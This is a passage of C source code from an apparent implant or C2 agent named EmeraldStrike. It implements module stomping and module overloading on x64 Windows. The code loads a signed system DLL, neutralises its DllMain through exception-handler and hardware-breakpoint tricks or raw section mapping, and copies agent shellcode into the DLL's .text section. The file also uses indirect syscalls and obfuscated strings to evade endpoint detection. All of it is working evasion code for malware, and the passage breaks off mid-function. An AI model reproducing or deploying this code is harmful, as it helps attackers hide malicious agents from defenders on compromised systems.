/*
    EmeraldStrike - Module Stomping Implementation

    VEH-based LoadLibraryW interception to load a sacrificial DLL with
    neutered DllMain, then copy the agent shellcode into its .text section
    so all return addresses point into a legitimate signed module.

    x64 only. Gated by INCLUDE_EVASION_MODULE_STOMP.
*/

#include "config.h"
#include "common.h"

#ifdef INCLUDE_EVASION_MODULE_STOMP
#ifdef _WIN64

#include "evasion/module_stomp.h"
#include "evasion/hellshall.h"


// ────────────────────────────────────────────────────────────────────
// Thread-local VEH context pointer.
// We cannot pass user data to a VEH handler, so we store the context
// in a thread-local via a well-known TEB slot. On x64, TEB->ArbitraryUserPointer
// at gs:[0x28] is available for this purpose. However, some runtimes
// use it, so we use a simple static - this is single-threaded at init.
// ────────────────────────────────────────────────────────────────────

static PINSTANCE g_ms_inst = nullptr;

// Active interception context. Normally &inst->ModuleStomp, but the
// shift-and-restore bootstrap path (module_shift.cc) uses a stack-local
// MODULE_STOMP_CTX so a transient shift does not disturb a persistent stomp.
static PMODULE_STOMP_CTX g_ms_ctx = nullptr;

// ────────────────────────────────────────────────────────────────────
// PE parsing helpers (PIC-safe, no CRT)
// ────────────────────────────────────────────────────────────────────

static BOOL ms_find_section(PVOID dll_base, const char* name,
                            PMS_SECTION_INFO out) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dll_base;
    if (dos->e_magic != 0x5A4D) return FALSE;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)dll_base + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    DWORD num = nt->FileHeader.NumberOfSections;

    for (DWORD i = 0; i < num; i++) {
        // Compare section name (8 bytes max, null-padded)
        const char* sn = (const char*)sec[i].Name;
        const char* cn = name;
        BOOL match = TRUE;
        for (int j = 0; j < 8; j++) {
            if (cn[j] == 0 && sn[j] == 0) break;
            if (cn[j] == 0 || sn[j] == 0 || cn[j] != sn[j]) { match = FALSE; break; }
        }
        if (match) {
            out->pBase = (PVOID)((PBYTE)dll_base + sec[i].VirtualAddress);
            out->dwVirtualSize = sec[i].Misc.VirtualSize;
            return TRUE;
        }
    }
    return FALSE;
}

// Find a single 0xC3 (ret) gadget in [start, start+len)
static PVOID ms_find_ret_gadget(PVOID start, SIZE_T len) {
    PBYTE p = (PBYTE)start;
    for (SIZE_T i = 0; i < len; i++) {
        if (p[i] == 0xC3) return (PVOID)(p + i);
    }
    return nullptr;
}

// ────────────────────────────────────────────────────────────────────
// VEH Handler - intercepts single-step exceptions during LoadLibraryW
// ────────────────────────────────────────────────────────────────────

// Context-register access (used by the VEH handler for direct DR disarm)
typedef NTSTATUS (NTAPI *fnNtGetCtx)(HANDLE, PCONTEXT);
typedef NTSTATUS (NTAPI *fnNtSetCtx)(HANDLE, PCONTEXT);

static LONG CALLBACK ms_veh_handler(PEXCEPTION_POINTERS pInfo) {
    if (pInfo->ExceptionRecord->ExceptionCode != 0x80000004 /*STATUS_SINGLE_STEP*/)
        return EXCEPTION_CONTINUE_SEARCH;

    PINSTANCE inst = g_ms_inst;
    if (!inst || !g_ms_ctx) return EXCEPTION_CONTINUE_SEARCH;

    PCONTEXT pCtx = pInfo->ContextRecord;
    PMODULE_STOMP_CTX ctx = g_ms_ctx;
    PVOID addr = pInfo->ExceptionRecord->ExceptionAddress;

    // #DB fired. Do NOT trust DR6 B bits for slot attribution - observed on
    // this Win11 build: the CONTEXT's Dr6 shows no B bits even for our own
    // execution breakpoints. Match the faulting address against our three
    // hook targets directly and disarm that slot; once all three have fired
    // (or the load's critical hooks are done), clear DR7 completely.
    // (x64 CONTEXT offsets: Dr0=0x48 Dr1=0x50 Dr2=0x58 Dr3=0x60 Dr6=0x68
    //  Dr7=0x70. 0x78 is RAX - writing "Dr6" there clobbers the interrupted
    //  code's RAX; observed as FAST_FAIL_GS_COOKIE_INIT when a hook hit lands
    //  inside the CRT/security-cookie init path.)
    {
        // The kernel does NOT apply the exception context's debug-register
        // writes on CONTINUE_EXECUTION on this Win11 build (verified: Dr7 stays
        // armed after the handler zeroes it in the context). Disarm via a
        // direct NtSetContextThread on the live thread instead, and strip
        // CONTEXT_DEBUG_REGISTERS from ContextFlags so NtContinue skips the DR
        // restore entirely and cannot re-apply the armed values.
        pCtx->ContextFlags &= ~0x00100010i64;
        DWORD64 dr6 = *(DWORD64*)((PBYTE)pCtx + 0x68);   // Dr6 = 0x68 (0x78 is RAX)

        fnNtGetCtx pGetCtx = (fnNtGetCtx)ctx->pGetCtx;
        fnNtSetCtx pSetCtx = (fnNtSetCtx)ctx->pSetCtx;
        CONTEXT drc;
        es_memset(&drc, 0, sizeof(drc));
        drc.ContextFlags = 0x00100010;   // CONTEXT_DEBUG_REGISTERS

        // start from the live register state (retry - a transient failure here
        // leaves the DRs armed and the process dies on the next unhandled #DB
        // once the VEH is removed)
        BOOL bHaveLive = FALSE;
        for (int r = 0; r < 4 && !bHaveLive; r++)
            bHaveLive = (pGetCtx && NT_SUCCESS(pGetCtx((HANDLE)-2, &drc)));
        if (!bHaveLive) {
            // Last resort: zero the DRs in the exception context AND keep
            // CONTEXT_DEBUG_REGISTERS set - if the kernel applies context DR
            // restores on this path, this clears them; if not, the defensive
            // clear after the load is the backstop.
            *(DWORD64*)((PBYTE)pCtx + 0x70) = 0;    // Dr7
            *(DWORD64*)((PBYTE)pCtx + 0x48) = 0;    // Dr0
            *(DWORD64*)((PBYTE)pCtx + 0x50) = 0;    // Dr1
            *(DWORD64*)((PBYTE)pCtx + 0x58) = 0;    // Dr2
            *(DWORD64*)((PBYTE)pCtx + 0x60) = 0;    // Dr3
            pCtx->ContextFlags |= 0x00100010;
            pCtx->EFlags |= 0x10000;
            return EXCEPTION_CONTINUE_EXECUTION;
        }

        if (bHaveLive) {
            BOOL bDr3Hit = (dr6 & 0x8);
            if (bDr3Hit && ctx->bLdrEntryFound && !ctx->bEntryPatched) {
                // Two-phase watch. Phase 1 (pSacLdrEntry == LDR list head):
                // Dr3 watches &head->Blink - a module was just LINKED. Resolve
                // the new entry via the PEB. On this build the entry links
                // BEFORE EntryPoint is filled, so if it is the sacrifice,
                // store it and re-arm Dr3 on &entry->EntryPoint (phase 2).
                // Phase 2 (pSacLdrEntry == the sacrifice's entry): the watched
                // EntryPoint field was just written - patch it with the ret
                // gadget and disarm everything.
                PPEB_FULL peb = (PPEB_FULL)__readgsqword(0x60);
                PLDR_DATA_TABLE_ENTRY_FULL entry = NULL;
                BOOL bTailWatch = FALSE;
                PLIST_ENTRY head = NULL;
                if (peb && peb->Ldr) {
                    head = &peb->Ldr->InMemoryOrderModuleList;
                    bTailWatch = (ctx->pSacLdrEntry == (PVOID)head);
                    if (bTailWatch) {
                        if (head->Blink && head->Blink != head)
                            entry = CONTAINING_RECORD(head->Blink, LDR_DATA_TABLE_ENTRY_FULL, InMemoryOrderLinks);
                    } else {
                        entry = (PLDR_DATA_TABLE_ENTRY_FULL)ctx->pSacLdrEntry;
                    }
                }
                // diag: log the resolved entry's DllBase/EntryPoint
                if (entry) {
                    char b5[128] = "MS: linked DllBase=................ EP=................";
                    const char* hx5 = "0123456789abcdef";
                    DWORD64 db5 = (DWORD64)entry->DllBase, ep5 = (DWORD64)entry->EntryPoint;
                    for (int q = 0; q < 16; q++) b5[17 + q] = hx5[(db5 >> ((15 - q) * 4)) & 0xF];
                    for (int q = 0; q < 16; q++) b5[39 + q] = hx5[(ep5 >> ((15 - q) * 4)) & 0xF];
                    b5[55] = 0;
                    TRACE(inst, b5);
                }
                if (entry && bTailWatch) {
                    if ((DWORD64)entry->DllBase == ctx->qwSacImageBase) {
                        if (entry->EntryPoint) {
                            // linked with EntryPoint already filled - patch now
                            ctx->pSacLdrEntry = (PVOID)entry;
                            // fall through to the patch below via phase-2 path
                        } else {
                            // re-arm Dr3 on &entry->EntryPoint (phase 2)
                            fnNtGetCtx pGetCtxA = (fnNtGetCtx)ctx->pGetCtx;
                            fnNtSetCtx pSetCtxA = (fnNtSetCtx)ctx->pSetCtx;
                            if (pGetCtxA && pSetCtxA) {
                                CONTEXT ac;
                                es_memset(&ac, 0, sizeof(ac));
                                ac.ContextFlags = 0x00100010;
                                if (NT_SUCCESS(pGetCtxA((HANDLE)-2, &ac))) {
                                    ac.Dr3 = (DWORD64)&entry->EntryPoint;
                                    ac.Dr7 |= 0xD0000040;
                                    pSetCtxA((HANDLE)-2, &ac);
                                }
                            }
                            ctx->pSacLdrEntry = (PVOID)entry;
                            TRACE(inst, "MS: phase2 watch on EntryPoint");
                            pCtx->EFlags |= 0x10000;
                            return EXCEPTION_CONTINUE_EXECUTION;
                        }
                    } else {
                        // unrelated module linked; keep the tail watch
                        pCtx->EFlags |= 0x10000;
                        return EXCEPTION_CONTINUE_EXECUTION;
                    }
                }
                if (entry && !bTailWatch) {
                    // Phase 2: EntryPoint just written
                    if (entry->EntryPoint) {

                    MS_SECTION_INFO textInfo3 = {0};
                    BOOL bSec3 = ms_find_section(entry->DllBase, ".text", &textInfo3);
                    {
                        char b6[96] = "MS: p2 szStomp=........ vsize=........ sec=0";
                        const char* hx6 = "0123456789abcdef";
                        DWORD64 ss6 = (DWORD64)ctx->szStomp, vs6 = (DWORD64)textInfo3.dwVirtualSize;
                        for (int q = 0; q < 8; q++) b6[14 + q] = hx6[(ss6 >> ((7 - q) * 4)) & 0xF];
                        for (int q = 0; q < 8; q++) b6[31 + q] = hx6[(vs6 >> ((7 - q) * 4)) & 0xF];
                        b6[42] = 0;
                        if (bSec3) b6[41] = '1';
                        TRACE(inst, b6);
                    }
                    if (bSec3) {
                        PVOID searchStart3 = (PVOID)((PBYTE)textInfo3.pBase + ctx->szStomp);
                        SIZE_T searchLen3 = textInfo3.dwVirtualSize - ctx->szStomp;
                        if ((ULONG_PTR)entry->EntryPoint < (ULONG_PTR)searchStart3) {
                            searchStart3 = entry->EntryPoint;
                            searchLen3 = textInfo3.dwVirtualSize -
                                (ULONG_PTR)((PBYTE)entry->EntryPoint - (PBYTE)textInfo3.pBase);
                        }
                        PVOID gadget = ms_find_ret_gadget(searchStart3, searchLen3);
                        {
                            char b7[96] = "MS: p2 gadget=................ start=................";
                            const char* hx7 = "0123456789abcdef";
                            DWORD64 g7 = (DWORD64)gadget, st7 = (DWORD64)searchStart3;
                            for (int q = 0; q < 16; q++) b7[14 + q] = hx7[(g7 >> ((15 - q) * 4)) & 0xF];
                            for (int q = 0; q < 16; q++) b7[36 + q] = hx7[(st7 >> ((15 - q) * 4)) & 0xF];
                            b7[52] = 0;
                            TRACE(inst, b7);
                        }
                        if (gadget) {
                            // Disarm BEFORE writing EntryPoint: the watch is ON
                            // &entry->EntryPoint, so the patch write itself
                            // faults a nested #DB inside this handler (infinite
                            // recursion -> stack exhaustion).
                            ctx->bEntryPatched = TRUE;
                            drc.Dr0 = 0; drc.Dr1 = 0; drc.Dr2 = 0; drc.Dr3 = 0; drc.Dr7 = 0;
                            pSetCtx((HANDLE)-2, &drc);
                            entry->EntryPoint = gadget;             // never run DllMain
                            entry->TlsIndex = (USHORT)-1;           // skip LdrpHandleTlsData
                            ctx->pRetGadget = gadget;
                            ctx->SacText.pBase = textInfo3.pBase;
                            ctx->SacText.dwVirtualSize = textInfo3.dwVirtualSize;
                            TRACE(inst, "MS: Dr3 entry patched");
                        }
                    }

                    }
                    // disarm everything - entry patched (or unpatchable)
                    drc.Dr0 = 0; drc.Dr1 = 0; drc.Dr2 = 0; drc.Dr3 = 0; drc.Dr7 = 0;
                }
            } else if (!bDr3Hit) {
                // Execution-hook hit: clear the fired slot. Keep L2/L3 when the
                // write-watch is still needed (RtlImageNtHeaderEx hit arms Dr3;
                // L3 fires when Ldr fills EntryPoint).
                PVOID targets[3] = { ctx->pNtCreateSection, ctx->pNtMapViewOfSection, ctx->pRtlImageNtHeaderEx };
                DWORD64 lbits[3] = { 1ULL, 4ULL, 16ULL };
                for (int k = 0; k < 3; k++) {
                    if (addr == targets[k]) {
                        drc.Dr7 &= ~lbits[k];
                        *(&drc.Dr0 + k) = 0;
                    }
                }
            }
            // Once the entry is patched nothing is left to catch.
            if (ctx->bEntryPatched) {
                drc.Dr0 = 0; drc.Dr1 = 0; drc.Dr2 = 0; drc.Dr3 = 0; drc.Dr7 = 0;
            }
            pSetCtx((HANDLE)-2, &drc);
        }

        // Execution breakpoints are FAULTS: the instruction has NOT executed.
        // RF suppresses the next #DB for exactly one instruction so the
        // breakpointed function's first instruction can run.
        pCtx->EFlags |= 0x10000;
    }

    // ── NtCreateSection: upgrade handle permissions to SECTION_ALL_ACCESS ──
    if (addr == ctx->pNtCreateSection) {
        pCtx->Rdx = SECTION_ALL_ACCESS;
    }
    // ── NtMapViewOfSection: duplicate the section handle for later unmap/remap ──
    else if (addr == ctx->pNtMapViewOfSection && !ctx->hSacSection) {
        BOOL dupOk = inst->Win32.DuplicateHandle(
            (HANDLE)-1,                 // source process (self)
            (HANDLE)pCtx->Rcx,          // source handle (first arg to NtMapViewOfSection)
            (HANDLE)-1,                 // target process (self)
            &ctx->hSacSection,          // output
            0, 0, DUPLICATE_SAME_ACCESS
        );
        TRACE(inst, dupOk ? "MS: DuplicateHandle ok" : "MS: DuplicateHandle FAILED");
    }
    // ── RtlImageNtHeaderEx: find LDR entry, arm Dr3 write-watch on EntryPoint ──
    else if (addr == ctx->pRtlImageNtHeaderEx && ctx->hSacSection) {
        // RtlImageNtHeaderEx is called ONCE per load on modern Win11, so the
        // register-scavenging heuristic (needs multiple hits) never completes.
        // Walk the PEB loader list instead: Rdx = image base at entry, find the
        // LDR entry with that DllBase deterministically, then arm Dr3 as a
        // write breakpoint on &entry->EntryPoint (see the Dr3 handler above).
        if (!ctx->bLdrEntryFound) {
            DWORD64 imgBase = pCtx->Rdx;
            ctx->qwSacImageBase = imgBase;

            // diag: log imgBase so we can tell which module this call was for
            {
                char b3[80] = "MS: RNH imgBase=0000000000000000";
                const char* hx3 = "0123456789abcdef";
                for (int s = 0; s < 16; s++)
                    b3[17 + s] = hx3[(imgBase >> ((15 - s) * 4)) & 0xF];
                b3[33] = 0;
                TRACE(inst, b3);
            }

            // The sacrifice's LDR entry is NOT yet linked when RtlImageNtHeaderEx
            // fires (PEB walk finds nothing - verified live), and register
            // scavenging false-positives. Instead, arm Dr3 as a WRITE watch on
            // the LDR list tail link (&head->Blink): LdrpInsertDataTableEntry's
            // last write is head->Blink = newEntry. On that fire we resolve the
            // just-linked entry via the PEB and patch its EntryPoint.
            PPEB_FULL peb = (PPEB_FULL)__readgsqword(0x60);
            if (peb && peb->Ldr) {
                PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
                PVOID pBlinkField = (PBYTE)head + 8;   // &head->Blink (Flink@+0, Blink@+8)
                // Arm via NtSetContextThread on the LIVE thread: exception-
                // context DR writes are ignored by the kernel on continue
                // (verified). Dr3 = &head->Blink, write, qword.
                // DR7: L3=bit6, RW3=01b@28-29, LEN3=11b(8 bytes)@30-31.
                fnNtGetCtx pGetCtxA = (fnNtGetCtx)ctx->pGetCtx;
                fnNtSetCtx pSetCtxA = (fnNtSetCtx)ctx->pSetCtx;
                CONTEXT ac;
                es_memset(&ac, 0, sizeof(ac));
                ac.ContextFlags = 0x00100010;
                if (pGetCtxA && pSetCtxA && NT_SUCCESS(pGetCtxA((HANDLE)-2, &ac))) {
                    ac.Dr3 = (DWORD64)pBlinkField;
                    ac.Dr7 |= 0xD0000040;
                    if (NT_SUCCESS(pSetCtxA((HANDLE)-2, &ac))) {
                        ctx->pSacLdrEntry = (PVOID)head;    // marks "watch armed"
                        ctx->bLdrEntryFound = TRUE;
                        TRACE(inst, "MS: Dr3 armed on LDR list tail");
                    } else {
                        TRACE(inst, "MS: Dr3 arm SetCtx failed");
                    }
                } else {
                    TRACE(inst, "MS: Dr3 arm GetCtx failed");
                }
            }
        }
    }

    // Hook bookkeeping done. Disarm the remaining breakpoints in this thread's
    // live debug registers (NtGet/SetContextThread round trip) - after any of
    // the three hooks fired there is nothing left to catch in this load.
    return EXCEPTION_CONTINUE_EXECUTION;
}

// ────────────────────────────────────────────────────────────────────
// Sacrifice DLL selection - pick randomly from known large signed DLLs
// ────────────────────────────────────────────────────────────────────

// Returns TRUE if a module with this basename is already in the PEB loader
// list. A second ms_load_sacrifice (shift bootstrap after a persistent stomp)
// must not pick a DLL that is already mapped: LoadLibraryW would just bump the
// refcount, the VEH would never see its hook targets, and interception would
// silently fail. Also naturally skips the DLL the agent itself lives in.
static BOOL ms_is_loaded(const wchar_t* path) {
    // basename of the candidate ("...\\gpsvc.dll" -> "gpsvc.dll")
    const wchar_t* cand = path;
    for (const wchar_t* p = path; *p; p++)
        if (*p == L'\\') cand = p + 1;
    int candLen = 0;
    while (cand[candLen]) candLen++;

    PPEB_FULL peb = (PPEB_FULL)__readgsqword(0x60);
    if (!peb || !peb->Ldr) return FALSE;
    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    for (PLIST_ENTRY e = head->Flink; e && e != head; e = e->Flink) {
        PLDR_DATA_TABLE_ENTRY_FULL mod = CONTAINING_RECORD(e, LDR_DATA_TABLE_ENTRY_FULL, InMemoryOrderLinks);
        if (!mod->BaseDllName.Buffer || mod->BaseDllName.Length == 0) continue;

        DWORD wlen = mod->BaseDllName.Length / sizeof(WCHAR);
        if ((int)wlen != candLen) continue;

        const wchar_t* a = mod->BaseDllName.Buffer;
        BOOL match = TRUE;
        for (DWORD k = 0; k < wlen; k++) {
            wchar_t ca = a[k], cb = cand[k];
            if (ca >= L'A' && ca <= L'Z') ca += 0x20;
            if (cb >= L'A' && cb <= L'Z') cb += 0x20;
            if (ca != cb) { match = FALSE; break; }
        }
        if (match) return TRUE;
    }
    return FALSE;
}

// Returns a heap (es_malloc) copy of the chosen path. The xwstr macro decrypts
// into a STACK buffer, so returning a pointer to it hands back a dangling
// frame pointer - it worked only while nothing touched the stack between
// selection and use. Copy to caller-provided storage instead.
static void ms_select_sacrifice(PINSTANCE inst, wchar_t* out, DWORD out_chars) {
    // Check which DLLs exist on this system
    // These are large, rarely loaded, signed Windows DLLs
    xwstr(_d0, L"C:\\Windows\\System32\\HostNetSvc.dll");
    xwstr(_d1, L"C:\\Windows\\System32\\WsmSvc.dll");
    xwstr(_d2, L"C:\\Windows\\System32\\localspl.dll");
    xwstr(_d3, L"C:\\Windows\\System32\\gpsvc.dll");

    // WsmSvc excluded (2026-11-08): stomping/overloading it crashes deterministically
    // at blob+0x32d (instance-pointer corruption -> write to KUSER_SHARED_DATA). The
    // same blob transfers cleanly into gpsvc/HostNetSvc/localspl. Root cause is some
    // WsmSvc-specific image property (1.8MB .text / unusual layout); revisit only if
    // the extra candidate is ever needed.
    const wchar_t* dlls[3];
    dlls[0] = _d0;
    dlls[1] = _d2;
    dlls[2] = _d3;

    // Copy immediately - the xwstr buffers die with this frame
    wchar_t live[4][64];
    BOOL found[4] = {FALSE, FALSE, FALSE, FALSE};
    int numFound = 0;

    for (int i = 0; i < 3; i++) {
        DWORD k = 0;
        while (dlls[i][k] && k < 63) { live[i][k] = dlls[i][k]; k++; }
        live[i][k] = 0;

        if (inst->Win32.GetFileAttributesW(live[i]) == INVALID_FILE_ATTRIBUTES)
            continue;
        if (ms_is_loaded(live[i]))
            continue;   // already mapped - would defeat VEH interception
        found[i] = TRUE;
        numFound++;
    }

    if (numFound == 0) { out[0] = 0; return; }

    // Simple PRNG seeded from RDTSC (PIC-safe, no CRT rand/srand needed)
    DWORD lo, hi;
    __asm__ volatile("rdtsc" : "=a"(lo), "=d"(hi));
    DWORD seed = lo ^ hi;

    // xorshift32 to pick a random candidate
    for (int attempts = 0; attempts < 32; attempts++) {
        seed ^= seed << 13;
        seed ^= seed >> 17;
        seed ^= seed << 5;
        int idx = (int)(seed % 3);
        if (found[idx]) {
            for (DWORD k = 0; k <= 63 && live[idx][k]; k++) out[k] = live[idx][k];
            out[63] = 0;
            return;
        }
    }

    // Fallback: return first found
    for (int i = 0; i < 3; i++) {
        if (found[i]) {
            for (DWORD k = 0; k <= 63 && live[i][k]; k++) out[k] = live[i][k];
            out[63] = 0;
            return;
        }
    }
    out[0] = 0;
}

// ────────────────────────────────────────────────────────────────────
// Non-VEH sacrifice mapping (LoadLibraryExW path)
// ────────────────────────────────────────────────────────────────────

BOOL ms_map_sacrifice_ex(PINSTANCE inst, PMODULE_STOMP_CTX ctx, DWORD required) {
    // Map a fresh sacrifice DLL WITHOUT running its init: no VEH, no
    // single-stepping, no loader-lock exposure. DONT_RESOLVE_DLL_REFERENCES
    // (0x1) maps the image, skips DllMain and TLS entirely - exactly what a
    // code transplant needs, since we never call the DLL's own functions.
    //
    // Used by the shift path. The persistent stomp keeps the VEH loader.
    ctx->szStomp = required;

    const wchar_t* sacName = nullptr;
    wchar_t sacBuf[64];
    ms_select_sacrifice(inst, sacBuf, 64);
    if (!sacBuf[0]) {
        DBG(inst, "[ES] ModuleMap: no sacrifice DLL found");
        return FALSE;
    }
    sacName = sacBuf;

    typedef HMODULE (WINAPI *fnLoadLibraryExW)(LPCWSTR, HANDLE, DWORD);
    xstr(_llex, "LoadLibraryExW");
    fnLoadLibraryExW pLLEx = (fnLoadLibraryExW)resolve_function(inst->Modules.Kernel32,
        hash_string_djb2(_llex));
    if (!pLLEx) {
        DBG(inst, "[ES] ModuleMap: LoadLibraryExW unresolved");
        return FALSE;
    }

    HMODULE hSac = pLLEx(sacName, NULL, 0x1 /* DONT_RESOLVE_DLL_REFERENCES */);
    if (!hSac) {
        DWORD gle = (DWORD)__readgsqword(0x68);   // TEB->LastErrorValue
        char buf[64] = "[ES] ModuleMap: LoadLibraryExW failed gle=";
        const char* hex = "0123456789abcdef";
        int p = 42;
        for (int s = 28; s >= 0 && p < 59; s -= 4) buf[p++] = hex[(gle >> s) & 0xF];
        buf[p] = 0;
        DBG(inst, buf);
        TRACE(inst, buf);
        return FALSE;
    }
    ctx->pSacDllBase = (PVOID)hSac;

    if (!ms_find_section(ctx->pSacDllBase, ".text", &ctx->SacText) ||
        ctx->SacText.dwVirtualSize < ctx->szStomp) {
        DBG(inst, "[ES] ModuleMap: sacrifice .text missing or too small");
        return FALSE;
    }
    ms_find_section(ctx->pSacDllBase, ".pdata", &ctx->SacPdata);
    return TRUE;
}

// ────────────────────────────────────────────────────────────────────
// Module overloading (DInvoke-style, no loader, no VEH, no debug registers)
// ────────────────────────────────────────────────────────────────────

// Map a signed decoy DLL via raw section mapping (NtCreateSection SEC_IMAGE on the
// file + NtMapViewOfSection) and overload it with the agent blob. The decoy never
// enters the PEB loader list, never runs DllMain/TLS, and never touches the loader
// lock - the entire VEH + hardware-breakpoint interception machinery exists only to
// work around LoadLibraryW's loader behavior, and raw section mapping eliminates the
// dependency completely.
//
// The mapping IS file-backed and derives from a signed image, so call-stack
// resolution and memory-scanner provenance checks see the same properties the stomp
// path provided. The .text region is made writable for the blob copy; the section's
// original protections are restored after the transfer.
//
// Fills the same ctx fields the VEH path does (pSacDllBase, SacText, SacPdata), so
// everything downstream in module_stomp_init is shared.
static BOOL ms_map_sacrifice_overload(PINSTANCE inst, PMODULE_STOMP_CTX ctx, DWORD required) {
    ctx->szStomp = required;

    wchar_t sacName[64];
    ms_select_sacrifice(inst, sacName, 64);
    if (!sacName[0]) {
        DBG(inst, "[ES] Overload: no sacrifice DLL found");
        return FALSE;
    }

    typedef HANDLE (WINAPI *fnCreateFileW)(LPCWSTR, DWORD, DWORD, PVOID, DWORD, DWORD, HANDLE);
    xstr(_cfw, "CreateFileW");
    fnCreateFileW pCreateFileW = (fnCreateFileW)resolve_function(inst->Modules.Kernel32,
        hash_string_djb2(_cfw));
    if (!pCreateFileW) {
        DBG(inst, "[ES] Overload: CreateFileW unresolved");
        return FALSE;
    }

    // Open the decoy file. FILE_SHARE_READ so a concurrent legitimate load can't
    // fail; we never let the loader see this handle's section.
    HANDLE hFile = pCreateFileW(sacName,
        FILE_GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        DBG(inst, "[ES] Overload: CreateFileW failed");
        return FALSE;
    }

    // SEC_IMAGE: the CA maps and lays out sections per the PE headers with correct
    // protections - the loader's mapping work without the loader. HellHall indirect
    // syscalls when HellsHall actually initialized (a zeroed NT_SYSCALL descriptor
    // means SSN 0 via a NULL stub address = call to NULL); ntdll exports otherwise.
    HANDLE hSection = NULL;
#if defined(INCLUDE_EVASION_HELLSHALL) && defined(_WIN64)
    NTSTATUS status;
    if (inst->bHellsHallInit) {
        status = HH_SYSCALL(inst->HH_Syscalls[HH_IDX_NtCreateSection],
            &hSection, SECTION_ALL_ACCESS, NULL, NULL,
            PAGE_READONLY, SEC_IMAGE, hFile);
    } else {
        status = inst->Win32.NtCreateSection(
            &hSection, SECTION_ALL_ACCESS, NULL, NULL,
            PAGE_READONLY, SEC_IMAGE, hFile);
    }
#else
    NTSTATUS status = inst->Win32.NtCreateSection(
        &hSection, SECTION_ALL_ACCESS, NULL, NULL,
        PAGE_READONLY, SEC_IMAGE, hFile);
#endif
    gate_CloseHandle(inst, hFile);
    if (status != 0 || !hSection) {
        DBG(inst, "[ES] Overload: NtCreateSection failed");
        return FALSE;
    }

    // Map with the section's own protections (PAGE_READONLY): SEC_IMAGE views
    // reject RW here. module_stomp_init VirtualProtects the .text region RW for
    // the copy and back to RWX for the transfer - no need for a writable view.
    PVOID base = NULL;
    SIZE_T viewSize = 0;
#if defined(INCLUDE_EVASION_HELLSHALL) && defined(_WIN64)
    if (inst->bHellsHallInit) {
        status = HH_SYSCALL(inst->HH_Syscalls[HH_IDX_NtMapViewOfSection],
            hSection, (HANDLE)(LONG_PTR)-1, &base, 0, 0, NULL,
            &viewSize, 2 /*ViewUnmap*/, 0, PAGE_READONLY);
    } else {
        status = inst->Win32.NtMapViewOfSection(
            hSection, (HANDLE)(LONG_PTR)-1, &base, 0, 0, NULL,
            &viewSize, 2, 0, PAGE_READONLY);
    }
#else
    status = inst->Win32.NtMapViewOfSection(
        hSection, (HANDLE)(LONG_PTR)-1, &base, 0, 0, NULL,
        &viewSize, 2, 0, PAGE_READONLY);
#endif
    gate_CloseHandle(inst, hSection);
    if (status != 0 || !base) {
        DBG(inst, "[ES] Overload: NtMapViewOfSection failed");
        return FALSE;
    }
    ctx->pSacDllBase = base;

    if (!ms_find_section(ctx->pSacDllBase, ".text", &ctx->SacText) ||
        ctx->SacText.dwVirtualSize < ctx->szStomp) {
        DBG(inst, "[ES] Overload: sacrifice .text missing or too small");
#if defined(INCLUDE_EVASION_HELLSHALL) && defined(_WIN64)
        if (inst->bHellsHallInit)
            HH_SYSCALL(inst->HH_Syscalls[HH_IDX_NtUnmapViewOfSection],
                (HANDLE)(LONG_PTR)-1, base);
        else
            inst->Win32.NtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, base);
#else
        inst->Win32.NtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, base);
#endif
        ctx->pSacDllBase = NULL;
        return FALSE;
    }
    ms_find_section(ctx->pSacDllBase, ".pdata", &ctx->SacPdata);
    return TRUE;
}

// ────────────────────────────────────────────────────────────────────
// Sacrifice DLL loading (shared by module stomp + module shift)
// ────────────────────────────────────────────────────────────────────

BOOL ms_load_sacrifice(PINSTANCE inst, PMODULE_STOMP_CTX ctx) {
    DBG(inst, "[ES] ModuleStomp: starting");

    // ── PRIMARY PATH: module overloading (raw section mapping) ──
    // No loader, no VEH, no debug registers. The stomp sizing happens later in
    // module_stomp_init, but the overload mapper needs the size up front - compute
    // it here (same formula: blob length; +pad under shift, which is retired).
    // Resolve the APIs ms_select_sacrifice/ms_is_loaded need BEFORE the overload
    // attempt - on the old VEH-only flow these were resolved further down (after
    // selection), and the overload path reaches the selector first. An unresolved
    // entry here is a call through NULL.
    if (!inst->Win32.GetFileAttributesW) {
        typedef DWORD (WINAPI *fnGetFileAttributesW2)(LPCWSTR);
        xstr(_gfaw, "GetFileAttributesW");
        inst->Win32.GetFileAttributesW = (fnGetFileAttributesW2)resolve_function(
            inst->Modules.Kernel32, hash_string_djb2(_gfaw));
    }

    DWORD required = (DWORD)inst->Base.Length;
    if (required == 0) {
        DBG(inst, "[ES] ModuleStomp: Base.Length is zero");
        return FALSE;
    }
#ifdef MODULE_STOMP_OVERLOAD
    if (ms_map_sacrifice_overload(inst, ctx, required)) {
        TRACE(inst, "MS: overload mapping OK");
        return TRUE;
    }
    TRACE(inst, "MS: overload failed, falling back to VEH loader");
#endif
    // Default: the proven VEH loader path. Overload runs only when the operator
    // opts in (MODULE_STOMP_OVERLOAD) - see builder.py module_overload param.

    // ── FALLBACK PATH: LoadLibraryW + VEH interception ──
    // Only reached if the raw section mapping failed (e.g. HH syscalls missing in
    // an unhooked build). Retains the DR machinery historically.
    //
    // ── Resolve additional APIs needed for module stomping ──
    PVOID k32 = inst->Modules.Kernel32;
    PVOID ntdll = inst->Modules.Ntdll;

    // LoadLibraryW (for loading the sacrifice DLL)
    typedef HMODULE (WINAPI *fnLoadLibraryW)(LPCWSTR);
    fnLoadLibraryW pLoadLibraryW = (fnLoadLibraryW)resolve_function(k32, H_LOADLIBRARYW);

    // AddVectoredExceptionHandler / RemoveVectoredExceptionHandler
    typedef PVOID (WINAPI *fnAddVEH)(ULONG, PVOID);
    typedef ULONG (WINAPI *fnRemoveVEH)(PVOID);
    fnAddVEH pAddVEH = (fnAddVEH)resolve_function(k32, H_ADDVECTOREDEXCEPTIONHANDLER);
    fnRemoveVEH pRemoveVEH = (fnRemoveVEH)resolve_function(k32, H_REMOVEVECTOREDEXCEPTIONHANDLER);

    // GetFileAttributesW (for checking sacrifice DLL existence)
